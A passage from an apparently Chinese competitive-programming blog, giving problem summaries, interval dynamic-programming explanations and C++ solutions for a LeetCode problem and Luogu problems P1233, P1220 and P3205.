punctuation">&#125;</span></code></pre><h4 id="LeetCode-解出数学表达式的学生分数"><a href="#LeetCode-解出数学表达式的学生分数" class="headerlink" title="LeetCode 解出数学表达式的学生分数"></a><a href="https://leetcode-cn.com/problems/the-score-of-students-solving-math-expression/">LeetCode 解出数学表达式的学生分数</a></h4><ul><li><p>题意：<br>给定一个由个位数数字、’$+$’、’$*$’组成的表达式，给定一个数组$answers[\quad]$，如果一答案等于表达式的正确结果，那么将得到 5 分。否则，如果答案由一处或多处错误的运算顺序计算得到那么将得到 2 分。求最后分数。</p></li><li><p>题解:<br>一开始以为暴力能解，发现行不通，考虑使用区间DP。<br>考虑先计算出正确值，然后再计算错误运算顺序得到的值。对于一个较大的区间，枚举最后一次的计算符号，记录即可。<br>转移方程为：</p><p>  $dp[i][i+step] insert(dp[i+t] \circ dp[i+t+2][i+step])$ 其中$\circ$ 表示 $+$ 或者 $*$ ，step为枚举的区间大小，t为枚举的最后一次运算顺序。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> <span class="token function">cal</span><span class="token punctuation">(</span>string <span class="token operator">&amp;</span>s<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>                <span class="token keyword">char</span> sign <span class="token operator">=</span> <span class="token char">'+'</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> c<span class="token punctuation">;</span>        <span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        stack<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> st<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token char">'0'</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token char">'9'</span><span class="token punctuation">)</span>                num <span class="token operator">=</span> num <span class="token operator">*</span> <span class="token number">10</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'0'</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'+'</span> <span class="token operator">||</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'*'</span> <span class="token operator">||</span> i <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>sign <span class="token operator">==</span> <span class="token char">'*'</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token keyword">int</span> tp <span class="token operator">=</span> st<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    st<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    st<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>tp <span class="token operator">*</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">else</span>                    st<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>                num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                sign <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>st<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            sum <span class="token operator">+=</span> st<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            st<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> sum<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">scoreOfStudents</span><span class="token punctuation">(</span>string s<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token operator">&amp;</span>answers<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">mp</span><span class="token punctuation">(</span><span class="token number">1030</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token operator">&amp;</span>it <span class="token operator">:</span> answers<span class="token punctuation">)</span>            mp<span class="token punctuation">[</span>it<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> len <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">3</span> <span class="token operator">*</span> mp<span class="token punctuation">[</span><span class="token function">cal</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span>unordered_set<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">></span> <span class="token function">dp</span><span class="token punctuation">(</span>len <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span>unordered_set<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span></span></span><span class="token punctuation">(</span>len <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> step <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> step <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> step <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">+</span> step <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> t <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> t <span class="token operator">&lt;</span> step<span class="token punctuation">;</span> t <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token operator">&amp;</span>x <span class="token operator">:</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">+</span> t<span class="token punctuation">]</span><span class="token punctuation">)</span>                    <span class="token punctuation">&#123;</span>                        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token operator">&amp;</span>y <span class="token operator">:</span> dp<span class="token punctuation">[</span>i <span class="token operator">+</span> t <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">+</span> step<span class="token punctuation">]</span><span class="token punctuation">)</span>                        <span class="token punctuation">&#123;</span>                            <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token operator">+</span>t<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token char">'+'</span><span class="token punctuation">)</span>                            <span class="token punctuation">&#123;</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">+</span> y <span class="token operator">&lt;=</span> <span class="token number">1000</span><span class="token punctuation">)</span>                                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">+</span> step<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>x <span class="token operator">+</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span>                            <span class="token keyword">else</span>                            <span class="token punctuation">&#123;</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">*</span> y <span class="token operator">&lt;=</span> <span class="token number">1000</span><span class="token punctuation">)</span>                                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">+</span> step<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>x <span class="token operator">*</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token operator">&amp;</span>x <span class="token operator">:</span> dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            res <span class="token operator">+=</span> <span class="token number">2</span> <span class="token operator">*</span> mp<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><h4 id="P1233-木棍加工"><a href="#P1233-木棍加工" class="headerlink" title="P1233 木棍加工"></a><a href="https://www.luogu.com.cn/problem/P1233">P1233 木棍加工</a></h4><ul><li><p>题意：<br>求最少最长不上升的子序列的数目。</p></li><li><p>题解:<br>根据Dilworth定理，最少最长不升子序列的数目=最长上升子序列的长度。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">dp</span><span class="token punctuation">(</span><span class="token number">5005</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">>></span> vec<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    vec<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>first <span class="token operator">>></span> vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>second<span class="token punctuation">;</span>    <span class="token function">sort</span><span class="token punctuation">(</span>vec<span class="token punctuation">.</span><span class="token function">rbegin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> vec<span class="token punctuation">.</span><span class="token function">rend</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>second <span class="token operator">></span> vec<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>second<span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        ans <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> ans<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> ans <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="区间与环形动态规划"><a href="#区间与环形动态规划" class="headerlink" title="区间与环形动态规划"></a><a href="https://www.luogu.com.cn/training/213#problems">区间与环形动态规划</a></h3><h4 id="P1220-关路灯"><a href="#P1220-关路灯" class="headerlink" title="P1220 关路灯"></a><a href="https://www.luogu.com.cn/problem/P1220">P1220 关路灯</a></h4><ul><li><p>题意：<br>求最少的耗电</p></li><li><p>题解:<br>考虑区间DP。<br>$dp[i][j][0]$表示区间i到j的灯都被关闭了，且站在第i个点；<br>$dp[i][j][1]$表示区间i到j的灯都被关闭了，且站在第j个点；<br>则有状态转移方程：</p><p>  $dp[i][j][0] = min(dp[i + 1][j][0] + cal(i, i + 1, i, j), dp[i + 1][j][1] + cal(i, j, i, j));$</p><p>  $dp[i][j][1] = min(dp[i][j - 1][1] + cal(j - 1, j, i - 1, j - 1), dp[i][j - 1][0] + cal(i, j, i - 1, j - 1));$</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">,</span> c<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">>></span> vec<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> prefix<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">cal</span><span class="token punctuation">(</span><span class="token keyword">int</span> u<span class="token punctuation">,</span> <span class="token keyword">int</span> v<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>vec<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">.</span>first <span class="token operator">-</span> vec<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>prefix<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">+</span> prefix<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">-</span> prefix<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>$ <span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> c<span class="token punctuation">;</span>    vec<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    prefix<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>first <span class="token operator">>></span> vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>second<span class="token punctuation">;</span>        prefix<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> prefix<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>second<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> inf<span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> inf<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    dp<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> c<span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token function">cal</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token function">cal</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token function">cal</span><span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">,</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token function">cal</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P3205-合唱队"><a href="#P3205-合唱队" class="headerlink" title="P3205 合唱队"></a><a href="https://www.luogu.com.cn/problem/P3205">P3205 合唱队</a></h4><ul><li>题意：<br>求初始队形的数量。</li></ul><ul><li><p>题解:<br>考虑使用区间DP。<br>$dp[i][j][0]$表示区间$[i,j]$且第i个元素从左边进入的方案数。$dp[i][j][1]$表示区间$[i,j]$且第j个元素从右边进入的方案数。<br>则存在动态转移方程：</p><script type="math/tex; mode=display">dp[i][j][0] +=\left\{\begin{aligned}  &dp[i+1][j][0],num[i]<num[i+1]\\  &dp[i+1][j][1],num[i]<num[j]\     \end{aligned}  \right.</script><script type="math/tex; mode=display">dp[i][j][1] +=\left\{\begin{aligned}  &dp[i][j-1][1],\quad num[j]>num[i]\\  &dp[i][j-1][0],\quad num[j]>num[i] \\  \end{aligned}  \right.</script></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> dp<span class="token punctuation">[</span><span class="token number">1005</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1005</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">num</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> len <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> len<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">+</span> len <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> len<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> num<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+=</span> dp<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token punctuation">]</span> 